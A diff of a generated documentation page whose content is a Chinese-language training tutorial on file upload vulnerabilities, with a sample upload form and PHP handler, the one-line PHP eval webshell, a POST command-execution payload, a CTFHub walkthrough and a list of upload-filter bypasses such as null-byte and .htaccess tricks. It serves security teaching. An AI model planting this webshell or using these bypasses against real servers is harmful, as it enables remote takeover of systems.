@@ -52,15 +52,17 @@
       
     
     
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0/dist/katex.min.css">
+    
       <link rel="stylesheet" href="../../../../../assets/document_dates/fonts/material-icons.css">
-    
-      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/tippy.css">
-    
-      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/scale.css">
     
       <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/material.css">
     
       <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/shift-away.css">
+    
+      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/tippy.css">
+    
+      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/scale.css">
     
       <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/light.css">
     
@@ -2243,120 +2245,177 @@
   
 
 
-<h1 id="_1">文件上传</h1>
-<h2 id="1">1.什么是文件上传漏洞</h2>
+<h1 id="_1">文件上传<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="1">1.什么是文件上传漏洞<a class="headerlink" href="#1" title="Permanent link">&para;</a></h2>
 <p>文件上传漏洞实际是因为开发者对于用户文件上传部分的控制不足或者处理缺陷，从而导致了用户可以越过自身有的权限向服务器上传<strong>可执行</strong>的动态脚本文件（前提是服务器会执行），这里的文件可以是木马，病毒，恶意脚本或者webshell等等。这个漏洞的问题本身不在于文件上传，而是文件上传之后服务器怎么处理，解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重后果。</p>
-<h4 id="_2">造成该漏洞的原因及原理</h4>
+<h4 id="_2">造成该漏洞的原因及原理<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
 <p>原因：</p>
 <p>1.对于上传文件的后缀名没有严格过滤</p>
 <p>2.对于文件头，二进制内容等等，用于描述文件类型的表述方法没有做检查</p>
 <p>3.没有对文件做不可执行的权限的处理</p>
 <p>原理：</p>
 <p>在web中上传文件的原理是通过将表单设置为multipart/form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上。</p>
-<h4 id="html">HTML表单文件上传机制</h4>
-<h5 id="11">1.1 表单文件上传基础</h5>
+<h4 id="html">HTML表单文件上传机制<a class="headerlink" href="#html" title="Permanent link">&para;</a></h4>
+<h5 id="11">1.1 表单文件上传基础<a class="headerlink" href="#11" title="Permanent link">&para;</a></h5>
 <p>在Web应用中，文件上传是一种常见的用户交互形式，允许用户通过表单上传文件到服务器。HTML表单提供了 <input type="file"> 元素，让用户可以选择文件进行上传。一旦用户选择了一个或多个文件，这些文件将被包含在表单数据中，并通过POST方法提交至服务器指定的处理脚本。</p>
-<h5 id="12">1.2 表单结构和提交机制</h5>
+<h5 id="12">1.2 表单结构和提交机制<a class="headerlink" href="#12" title="Permanent link">&para;</a></h5>
 <p>一个典型的文件上传表单结构如下：</p>
-<pre><code>&lt;form action="/upload" method="post" enctype="multipart/form-data"&gt;
-    &lt;input type="file" name="fileToUpload" id="fileToUpload"&gt;
-    &lt;input type="submit" value="Upload File" name="submit"&gt;
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code>&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;file&quot; name=&quot;fileToUpload&quot; id=&quot;fileToUpload&quot;&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;
 &lt;/form&gt;
-</code></pre>
+</code></pre></div></td></tr></table></div>
 <p>html</p>
 <p>在这个表单中， enctype 属性设置为 multipart/form-data 是必须的，因为这是处理文件上传的正确编码类型。表单提交后，文件数据会被分割成多个部分，每个部分对应一个表单控件。 </p>
-<h5 id="13">1.3上传过程</h5>
+<h5 id="13">1.3上传过程<a class="headerlink" href="#13" title="Permanent link">&para;</a></h5>
 <p>前端(可能会有检查限制)-&gt;二进制流（这里会发生服务器端的检查也就是检查文件内容进行进一步的限制）-&gt;服务器解析-&gt;储存到服务器的相应位置</p>
 <p>访问时由于大部分网站会配置php解释器所以在访问.php文件的时候.php文件会被执行。</p>
 <p><strong>用大家建的sqli-lab网站进行说明</strong></p>
 <p>简单的上传页面（保存为.html文件）保存在大家建站的目录底下</p>
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
-    &lt;title&gt;POST数据包POC&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
-&lt;!--链接是当前打开的题目链接--&gt;
-    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;
-    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
-    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;
-&lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span>
+<span class="normal"><a href="#__codelineno-0-11">11</a></span>
+<span class="normal"><a href="#__codelineno-0-12">12</a></span>
+<span class="normal"><a href="#__codelineno-0-13">13</a></span>
+<span class="normal"><a href="#__codelineno-0-14">14</a></span>
+<span class="normal"><a href="#__codelineno-0-15">15</a></span>
+<span class="normal"><a href="#__codelineno-0-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>&lt;!DOCTYPE html&gt;
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>&lt;html lang=&quot;en&quot;&gt;
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>&lt;head&gt;
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>    &lt;meta charset=&quot;UTF-8&quot;&gt;
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>    &lt;title&gt;POST数据包POC&lt;/title&gt;
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a>&lt;/head&gt;
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a>&lt;body&gt;
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a>&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a>&lt;!--链接是当前打开的题目链接--&gt;
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a>    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12"></a>    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13"></a>    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14"></a>&lt;/form&gt;
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15"></a>&lt;/body&gt;
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16"></a>&lt;/html&gt;
+</span></code></pre></div></td></tr></table></div>
 <p>服务器端处理文件的代码：保存为upload.php注意上头的连接上传到的就是我们的upload.php进行服务器端的处理创建文件夹等等</p>
-<pre><code>&lt;?php
-// 1. 设置上传目录
-$uploadDir = 'uploads/';
-
-// 2. 创建目录（如果不存在）
-if (!file_exists($uploadDir)) {
-    mkdir($uploadDir, 0777, true);
-}
-
-// 3. 获取上传的文件信息
-$fileName = $_FILES['file']['name'];      // 原始文件名
-$tmpName = $_FILES['file']['tmp_name'];   // 临时文件路径
-$fileSize = $_FILES['file']['size'];      // 文件大小
-$fileError = $_FILES['file']['error'];    // 错误代码
-
-// 4. 检查是否有上传错误
-if ($fileError !== 0) {
-    die(&quot;上传失败，错误代码: $fileError&quot;);
-}
-
-// 5. 生成安全的文件名（防止中文乱码和重复）
-$safeFileName = time() . '_' . preg_replace('/[^a-zA-Z0-9\.]/', '_', $fileName);
-
-// 6. 移动文件到目标目录
-$destination = $uploadDir . $safeFileName;
-
-if (move_uploaded_file($tmpName, $destination)) {
-    echo &quot;&lt;h3&gt;success&lt;/h3&gt;&quot;;
-    echo &quot;name: &quot; . $fileName . &quot;&lt;br&gt;&quot;;
-    echo &quot;size: &quot; . round($fileSize / 1024, 2) . &quot; KB&lt;br&gt;&quot;;
-    echo &quot;&lt;a href='$destination'&gt;dowload&lt;/a&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &quot;&lt;a href='index.html'&gt;return&lt;/a&gt;&quot;;
-} else {
-    echo &quot;false！&quot;;
-}
-?&gt;
-</code></pre>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-1-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-1-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-1-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-1-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-1-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-1-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-1-10">10</a></span>
+<span class="normal"><a href="#__codelineno-1-11">11</a></span>
+<span class="normal"><a href="#__codelineno-1-12">12</a></span>
+<span class="normal"><a href="#__codelineno-1-13">13</a></span>
+<span class="normal"><a href="#__codelineno-1-14">14</a></span>
+<span class="normal"><a href="#__codelineno-1-15">15</a></span>
+<span class="normal"><a href="#__codelineno-1-16">16</a></span>
+<span class="normal"><a href="#__codelineno-1-17">17</a></span>
+<span class="normal"><a href="#__codelineno-1-18">18</a></span>
+<span class="normal"><a href="#__codelineno-1-19">19</a></span>
+<span class="normal"><a href="#__codelineno-1-20">20</a></span>
+<span class="normal"><a href="#__codelineno-1-21">21</a></span>
+<span class="normal"><a href="#__codelineno-1-22">22</a></span>
+<span class="normal"><a href="#__codelineno-1-23">23</a></span>
+<span class="normal"><a href="#__codelineno-1-24">24</a></span>
+<span class="normal"><a href="#__codelineno-1-25">25</a></span>
+<span class="normal"><a href="#__codelineno-1-26">26</a></span>
+<span class="normal"><a href="#__codelineno-1-27">27</a></span>
+<span class="normal"><a href="#__codelineno-1-28">28</a></span>
+<span class="normal"><a href="#__codelineno-1-29">29</a></span>
+<span class="normal"><a href="#__codelineno-1-30">30</a></span>
+<span class="normal"><a href="#__codelineno-1-31">31</a></span>
+<span class="normal"><a href="#__codelineno-1-32">32</a></span>
+<span class="normal"><a href="#__codelineno-1-33">33</a></span>
+<span class="normal"><a href="#__codelineno-1-34">34</a></span>
+<span class="normal"><a href="#__codelineno-1-35">35</a></span>
+<span class="normal"><a href="#__codelineno-1-36">36</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>&lt;?php
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>// 1. 设置上传目录
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>$uploadDir = &#39;uploads/&#39;;
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a>// 2. 创建目录（如果不存在）
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>if (!file_exists($uploadDir)) {
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a>    mkdir($uploadDir, 0777, true);
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a>}
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a>// 3. 获取上传的文件信息
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a>$fileName = $_FILES[&#39;file&#39;][&#39;name&#39;];      // 原始文件名
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12"></a>$tmpName = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];   // 临时文件路径
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13"></a>$fileSize = $_FILES[&#39;file&#39;][&#39;size&#39;];      // 文件大小
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14"></a>$fileError = $_FILES[&#39;file&#39;][&#39;error&#39;];    // 错误代码
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15"></a>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16"></a>// 4. 检查是否有上传错误
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17"></a>if ($fileError !== 0) {
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18"></a>    die(&quot;上传失败，错误代码: $fileError&quot;);
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19"></a>}
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20"></a>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21"></a>// 5. 生成安全的文件名（防止中文乱码和重复）
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22"></a>$safeFileName = time() . &#39;_&#39; . preg_replace(&#39;/[^a-zA-Z0-9\.]/&#39;, &#39;_&#39;, $fileName);
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23"></a>
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24"></a>// 6. 移动文件到目标目录
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25"></a>$destination = $uploadDir . $safeFileName;
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26"></a>
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27"></a>if (move_uploaded_file($tmpName, $destination)) {
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28"></a>    echo &quot;&lt;h3&gt;success&lt;/h3&gt;&quot;;
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29"></a>    echo &quot;name: &quot; . $fileName . &quot;&lt;br&gt;&quot;;
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30"></a>    echo &quot;size: &quot; . round($fileSize / 1024, 2) . &quot; KB&lt;br&gt;&quot;;
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31"></a>    echo &quot;&lt;a href=&#39;$destination&#39;&gt;dowload&lt;/a&gt;&lt;br&gt;&lt;br&gt;&quot;;
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32"></a>    echo &quot;&lt;a href=&#39;index.html&#39;&gt;return&lt;/a&gt;&quot;;
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33"></a>} else {
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34"></a>    echo &quot;false！&quot;;
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35"></a>}
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36"></a>?&gt;
+</span></code></pre></div></td></tr></table></div>
 <p><img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20251203202833936.png" alt="image-20251203202833936" style="zoom:80%;" /></p>
 <p>打开准备上传即可。</p>
-<h2 id="2">2.我们要上传些什么？一句话木马登场~</h2>
-<h4 id="_3">木马是什么？</h4>
+<h2 id="2">2.我们要上传些什么？一句话木马登场~<a class="headerlink" href="#2" title="Permanent link">&para;</a></h2>
+<h4 id="_3">木马是什么？<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
 <p>计算机木马病毒是指隐藏在正常程序中的一段具有特殊功能的恶意代码，是具备破坏和删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。 
 木马程序表面上是无害的，甚至对没有警戒的用户还颇有吸引力，它们经常隐藏在游戏或图形软件中，但它们却隐藏着恶意。这些表面上看似友善的程序运行后，就会进行一些非法的行动，如删除文件或对硬盘格式化。 
 完整的木马程序一般由两部分组成：一个是服务器端，一个是控制器端。“中了木马”就是指安装了木马的服务器端程序，若你的电脑被安装了服务器端程序，则拥有相应客户端的人就可以通过网络控制你的电脑。为所欲为。这时你电脑上的各种文件、程序，以及在你电脑上使用的账号、密码无安全可言了。</p>
-<h4 id="_4">一句话木马</h4>
-<pre><code class="language-php">&lt;?php @eval($_POST['cmd']);?&gt;
-</code></pre>
+<h4 id="_4">一句话木马<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>这个一句话木马是什么意思呢</p>
 <p>它实际上是一个php代码所以它必须写在<?php ?>里面才能被服务器认出来才会被解析执行</p>
 <p>@是执行错误也不报错因为我们上传的cmd实际上是一个变量变量没有被定义是用不了的所以会报错，@存在的意义就是让我们的木马能够被正常执行</p>
 <p>这句话的意思是什么呢？</p>
 <p>我们上传了一个cmd的超全局变量供我们使用，且这个变量是以POST形式接受我们上传的参数的</p>
 <p>（网站的参数上传有GET和POST两种方式）</p>
-<pre><code>  cmd=header(&quot;Content-type:text/html;charset=gbk&quot;);
-  exec(&quot;ipconfig&quot;,$out);
-  echo '&lt;pre&gt;';
-  print_r($out);
-  echo '&lt;/pre&gt;';
-</code></pre>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span>
+<span class="normal"><a href="#__codelineno-3-4">4</a></span>
+<span class="normal"><a href="#__codelineno-3-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>  cmd=header(&quot;Content-type:text/html;charset=gbk&quot;);
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>  exec(&quot;ipconfig&quot;,$out);
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>  echo &#39;&lt;pre&gt;&#39;;
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>  print_r($out);
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a>  echo &#39;&lt;/pre&gt;&#39;;
+</span></code></pre></div></td></tr></table></div>
 <p><img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20251203200732792.png" alt="image-20251203200732792" style="zoom:80%;" /></p>
 <p><img alt="image-20251203200758142" src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20251203200758142.png" /></p>
 <p>这个时候我们就可以通过cmd这个变量去执行任意指令接管计算机了</p>
 <p>当然一般情况我们会使用工具去进行连接。</p>
-<h2 id="3">3.中国蚁剑</h2>
+<h2 id="3">3.中国蚁剑<a class="headerlink" href="#3" title="Permanent link">&para;</a></h2>
 <p>这就是我们会用到的工具</p>
 <p>安装及原理：https://blog.csdn.net/hj06112/article/details/150274005</p>
 <p>其实原理就是利用上方的cmd变量去执行指令不过这里蚁剑自动帮你把指令输出执行并且把回显结果给返回给你。</p>
 <p><img alt="img" src="https://i-blog.csdnimg.cn/direct/1bbe9d60189f476ba984b928ce091020.png" /></p>
-<h2 id="4">4.题目演练</h2>
+<h2 id="4">4.题目演练<a class="headerlink" href="#4" title="Permanent link">&para;</a></h2>
 <p>ctfhub-文件上传无验证</p>
 <p><img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20251203192234885.png" alt="image-20251203192234885" style="zoom:80%;" /></p>
 <p>游览上传我们写好的php木马</p>
@@ -2370,44 +2429,44 @@ if (move_uploaded_file($tmpName, $destination)) {
 <p><img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20251203192603287.png" alt="image-20251203192603287" style="zoom:80%;" /></p>
 <p>然后找flag即可</p>
 <p><img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20251203192620035.png" alt="image-20251203192620035" style="zoom:80%;" /></p>
-<h2 id="_5">一些限制和绕过手段</h2>
-<h4 id="_6">一.前端限制</h4>
-<h4 id="javascript">JavaScript前端文件上传验证</h4>
-<h5 id="_7">一、基本概念</h5>
+<h2 id="_5">一些限制和绕过手段<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<h4 id="_6">一.前端限制<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<h4 id="javascript">JavaScript前端文件上传验证<a class="headerlink" href="#javascript" title="Permanent link">&para;</a></h4>
+<h5 id="_7">一、基本概念<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h5>
 <p><strong>JavaScript文件上传验证</strong>是一种<strong>纯前端验证手段</strong>，主要作用是在文件上传到服务器之前，在用户的浏览器中进行初步检查。</p>
-<h5 id="_8">二、主要作用</h5>
-<h6 id="1_1">1. <strong>用户体验优化</strong></h6>
+<h5 id="_8">二、主要作用<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h5>
+<h6 id="1_1">1. <strong>用户体验优化</strong><a class="headerlink" href="#1_1" title="Permanent link">&para;</a></h6>
 <ul>
 <li><strong>即时反馈</strong>：用户选择文件后立即得到反馈</li>
 <li><strong>避免不必要的等待</strong>：在本地就过滤掉明显不合规的文件</li>
 <li><strong>清晰的错误提示</strong>：直接告诉用户问题所在</li>
 </ul>
-<h6 id="2_1">2. <strong>减轻服务器负担</strong></h6>
+<h6 id="2_1">2. <strong>减轻服务器负担</strong><a class="headerlink" href="#2_1" title="Permanent link">&para;</a></h6>
 <ul>
 <li>过滤掉超大的文件（如超过限制的）</li>
 <li>过滤掉明显错误的文件类型</li>
 <li>减少无效请求到服务器</li>
 </ul>
-<h6 id="3_1">3. <strong>基本安全检查</strong></h6>
+<h6 id="3_1">3. <strong>基本安全检查</strong><a class="headerlink" href="#3_1" title="Permanent link">&para;</a></h6>
 <ul>
 <li>检查文件扩展名（.jpg/.png等）</li>
 <li>检查文件大小</li>
 <li>检查MIME类型</li>
 </ul>
-<h5 id="_9">简单绕过方法</h5>
-<h6 id="1-javascript"><strong>1. 禁用JavaScript</strong></h6>
+<h5 id="_9">简单绕过方法<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h5>
+<h6 id="1-javascript"><strong>1. 禁用JavaScript</strong><a class="headerlink" href="#1-javascript" title="Permanent link">&para;</a></h6>
 <ul>
 <li>浏览器设置中关闭JavaScript</li>
 <li>使用NoScript等插件</li>
 </ul>
-<h6 id="2-burpsuite"><strong>2. 使用BurpSuite等工具</strong></h6>
+<h6 id="2-burpsuite"><strong>2. 使用BurpSuite等工具</strong><a class="headerlink" href="#2-burpsuite" title="Permanent link">&para;</a></h6>
 <ul>
 <li>拦截HTTP请求</li>
 <li>直接修改文件名和内容</li>
 <li>绕过所有前端检查</li>
 </ul>
-<h3 id="_10">二、服务端检测绕过</h3>
-<h4 id="21">2.1 扩展名检查</h4>
+<h3 id="_10">二、服务端检测绕过<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<h4 id="21">2.1 扩展名检查<a class="headerlink" href="#21" title="Permanent link">&para;</a></h4>
 <p><strong>原理</strong>：黑名单/白名单验证文件扩展名
 <strong>绕过方法</strong>：</p>
 <ul>
@@ -2417,16 +2476,16 @@ if (move_uploaded_file($tmpName, $destination)) {
 <li><strong>Nginx空字节</strong>：<code>xxx.jpg%00.php</code>解析为PHP</li>
 <li><strong>Apache解析</strong>：<code>a.php.rar</code>从右向左识别为PHP</li>
 </ul>
-<h4 id="22-content-type">2.2 Content-Type检查</h4>
+<h4 id="22-content-type">2.2 Content-Type检查<a class="headerlink" href="#22-content-type" title="Permanent link">&para;</a></h4>
 <p><strong>原理</strong>：检查HTTP头中的MIME类型
 <strong>绕过方法</strong>：使用BurpSuite修改Content-Type为允许的类型</p>
-<h4 id="23">2.3 文件头检测</h4>
+<h4 id="23">2.3 文件头检测<a class="headerlink" href="#23" title="Permanent link">&para;</a></h4>
 <p><strong>原理</strong>：检查文件头部特征（前10字节）
 <strong>绕过方法</strong>：给脚本文件添加对应的文件头</p>
-<h4 id="24-web">2.4 限制Web服务器行为</h4>
+<h4 id="24-web">2.4 限制Web服务器行为<a class="headerlink" href="#24-web" title="Permanent link">&para;</a></h4>
 <p><strong>原理</strong>：限制特定目录的脚本执行权限</p>
 <p><strong>绕过方法</strong>：上传<code>.htaccess</code>文件覆盖服务器配置</p>
-<h4 id="25-00">2.5 00截断</h4>
+<h4 id="25-00">2.5 00截断<a class="headerlink" href="#25-00" title="Permanent link">&para;</a></h4>
 <p><strong>原理</strong>：文件系统遇到<code>0x00</code>认为文件结束
 <strong>绕过方法</strong>：将文件名如<code>evil.php.jpg</code>改为<code>evil.php%00.jpg</code></p>
 <p>（绕过方法希望大家能自己去多了解这里不做过多的赘述，培训更多的是想让大家了解漏洞的底层逻辑）</p>
@@ -2539,7 +2598,15 @@ if (move_uploaded_file($tmpName, $destination)) {
     
       <script src="../../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
       
-        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.js"></script>
+      
+        <script src="../../../../../assets/javascripts/pangu-init.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/contrib/auto-render.min.js"></script>
+      
+        <script src="../../../../../assets/javascripts/katex-init.js"></script>
       
         <script src="../../../../../assets/document_dates/tippy/popper.min.js"></script>
       
